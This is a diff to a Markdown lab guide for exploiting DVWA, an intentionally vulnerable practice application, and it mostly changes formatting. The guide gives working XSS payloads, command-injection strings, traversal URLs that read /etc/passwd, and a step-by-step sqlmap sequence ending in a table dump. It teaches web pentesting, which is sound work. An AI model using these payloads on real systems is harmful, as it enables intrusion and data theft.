@@ -38,16 +38,16 @@ Web application penetration testing is the process of using penetration testing 
 
 ## Exploiting DVWA
 
-### 1.Cross Site Scripting(XSS)
+### 1. Cross Site Scripting(XSS)
 
 #### What is Cross Site Scripting?
 Cross-site Scripting (XSS) is a client-side code injection attack. The attacker aims to execute malicious scripts in a web browser of the victim by including malicious code in a legitimate web page or web application. The actual attack occurs when the victim visits the web page or web application that executes the malicious code. The web page or web application becomes a vehicle to deliver the malicious script to the user’s browser. Vulnerable vehicles that are commonly used for Cross-site Scripting attacks are forums, message boards, and web pages that allow comments.
 
-#### Types of Cross Site Scripting
-**1. Reflected Cross-Site Scripting**
+### Types of Cross Site Scripting
+**1. Reflected Cross-Site Scripting**<br>
 **2. Stored Cross-Site Scripting**
 
-#### Reflected Cross-Site Scripting
+### Reflected Cross-Site Scripting
 
 #### What is reflected cross-site scripting?
 The most common type of XSS is Reflected XSS (Non-persistent XSS). In this case, the attackers payload has to be a part of the request that is sent to the web server. It is then reflected back in such a way that the HTTP response includes the payload from the HTTP request. Attackers use malicious links, phishing emails, and other social engineering techniques to lure the victim into making a request to the server. The reflected XSS payload is then executed in the user’s browser.
@@ -58,7 +58,7 @@ Payload : ```<script>alert("xss")</script>```
 **Set security medium**<br>
 Paylod : ```<ScrIpt>alert("xss")</ScrIpt>```
 
-#### Stored Cross-Site Scripting
+### Stored Cross-Site Scripting
 The most damaging type of XSS is Stored XSS (Persistent XSS). An attacker uses Stored XSS to inject malicious content (referred to as the payload), most often JavaScript code, into the target application. If there is no input validation, this malicious code is permanently stored (persisted) by the target application, for example within a database. For example, an attacker may enter a malicious script into a user input field such as a blog comment field or in a forum post.
 
 **Set security low**<br>
@@ -72,8 +72,6 @@ Use Inspect Element to change the given length for text area of name field and t
 #### More XSS Payloads
 1. [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
 
-
-
 ### 2. Command Injection 
 #### What is Command Injection?
 Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.
@@ -85,7 +83,7 @@ Payload : ```127.0.0.1; pwd``` --> Prints working directory
 Payload : ```192.168.0.1| pwd```
 
 **More payloads**<br>
-1. 
+1.  Example payloads
 ```
 127.0.0.1; pwd
 127.0.0.1 || pwd
@@ -93,25 +91,25 @@ Payload : ```192.168.0.1| pwd```
 127.0.0.1 & pwd
 127.0.0.1 | pwd
 ```
-
-2. [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
+2.  [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
 
 ### 3. File Inclusion
-#### Types of Cross Site Scripting
-**1. Local File Inclusion** <br>
+#### Types of Cross Site Scripting :
+**1. Local File Inclusion** <br><br>
 LFI vulnerabilities allow an attacker to read (and sometimes execute) files on the victim machine. This can be very dangerous because if the web server is misconfigured and running with high privileges, the attacker may gain access to sensitive information. If the attacker is able to place code on the web server through other means, then they may be able to execute arbitrary commands.<br>
 
-**2. Remote File Inclusion**<br>
+**2. Remote File Inclusion**<br><br>
 RFI vulnerabilities are easier to exploit but less common. Instead of accessing a file on the local machine, the attacker is able to execute code hosted on their own machine.
 
-#### Local File Inclusion
+### Local File Inclusion
 
 **Set security low**<br>
-In the browser address bar, enter the following:<br>
-``http://192.168.80.134/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd``<br>
+In the browser address bar, enter the following:<br><br>
+``http://192.168.80.134/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd``<br><br>
 The ``‘../’`` characters used in the example above represent a directory traversal. The number of ``‘../’`` sequences depends on the configuration and location of the target web server on the victim machine. Some experimentation may be required.<br>
 
 **Set security medium**<br>
+In the browser address bar, enter the following:<br>
 ``http://10.5.251.4/dvwa/vulnerabilities/fi/?page=files:///../../../../../../../../etc/passwd``<br>
 
 **More payloads**<br>
@@ -124,33 +122,33 @@ SQL Injection (SQLi) is a type of an injection attack that makes it possible to 
 #### Tool Used
 **sqlmap** : sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a kick-ass detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.<br><br>
 
-**Step 1** : Start Burpsuite<br>
-**Step 2** : Install burp extenstion CO2 from Bwapp store from extension section  <br>
-**Step 3** : Set browser proxy to IP 127.0.0.1 and PORT 8080<br>
-**Step 4** : Intercept the DVWA traffic for sql <br>
-**Step 5** : Send that traffic to sqlmapper by right clicking on the intercept part<br>
-**Step 6** : Copy the code from CO2 sqlmap command<br>
-**Step 7** : The copied command will be like this <br>``-u "http://10.5.251.4:80/dvwa/vulnerabilities/sqli/?id=2^&Submit=Submit" --cookie="security=low;PHPSESSID=4ff2a823e64e9f7c2fdf14adfc4c6ef7"``<br>
+**Step 1** : Start Burpsuite<br><br>
+**Step 2** : Install burp extenstion CO2 from Bwapp store from extension section  <br><br>
+**Step 3** : Set browser proxy to IP 127.0.0.1 and PORT 8080<br><br>
+**Step 4** : Intercept the DVWA traffic for sql <br><br>
+**Step 5** : Send that traffic to sqlmapper by right clicking on the intercept part<br><br>
+**Step 6** : Copy the code from CO2 sqlmap command<br><br>
+**Step 7** : The copied command will be like this <br>``-u "http://10.5.251.4:80/dvwa/vulnerabilities/sqli/?id=2^&Submit=Submit" --cookie="security=low;PHPSESSID=4ff2a823e64e9f7c2fdf14adfc4c6ef7"``<br><br>
 **Step 8** : Execute the folling commands<br>
 ```
 sqlmap -u "http://10.5.251.4:80/dvwa/vulnerabilities/sqli/?id=2^&Submit=Submit" --cookie="security=low;PHPSESSID=4ff2a823e64e9f7c2fdf14adfc4c6ef7" --dbs
 ``` 
-The above command will list the database anem which is present on the website if it is vulnerable. So from the list of database name copy any one database name which you want to explore more.<br>
+The above command will list the database anem which is present on the website if it is vulnerable. So from the list of database name copy any one database name which you want to explore more.<br><br>
 **Step 9** : Execute the folling commands
 ```
 sqlmap -u "http://10.5.251.4:80/dvwa/vulnerabilities/sqli/?id=2^&Submit=Submit" --cookie="security=low;PHPSESSID=4ff2a823e64e9f7c2fdf14adfc4c6ef7" --dbs -D <The database name you copied earlier> --tables
 ```
-Now this command will list the table name of that database<br>
+Now this command will list the table name of that database<br><br>
 **Step 10** : Execute the folling commands
 ```
 sqlmap -u "http://10.5.251.4:80/dvwa/vulnerabilities/sqli/?id=2^&Submit=Submit" --cookie="security=low;PHPSESSID=4ff2a823e64e9f7c2fdf14adfc4c6ef7" --dbs -D <The database name you copied earlier> -T <table name> --columns
 ```
-The above command will list the coulmns name of the table<br>
+The above command will list the coulmns name of the table<br><br>
 **Step 11** : Execute the folling commands
 ```
 sqlmap -u "http://10.5.251.4:80/dvwa/vulnerabilities/sqli/?id=2^&Submit=Submit" --cookie="security=low;PHPSESSID=4ff2a823e64e9f7c2fdf14adfc4c6ef7" --dbs -D <The database name you copied earlier> -T <table name> -C <columns>
 ```
-This command will list all the data which is present in that column<br>
+This command will list all the data which is present in that column<br><br>
 **Step 12** : Execute the folling commands
 ```
 sqlmap -u "http://10.5.251.4:80/dvwa/vulnerabilities/sqli/?id=2^&Submit=Submit" --cookie="security=low;PHPSESSID=4ff2a823e64e9f7c2fdf14adfc4c6ef7" --dbs -D <The database name you copied earlier> -T <table name> -C <column name> --dump
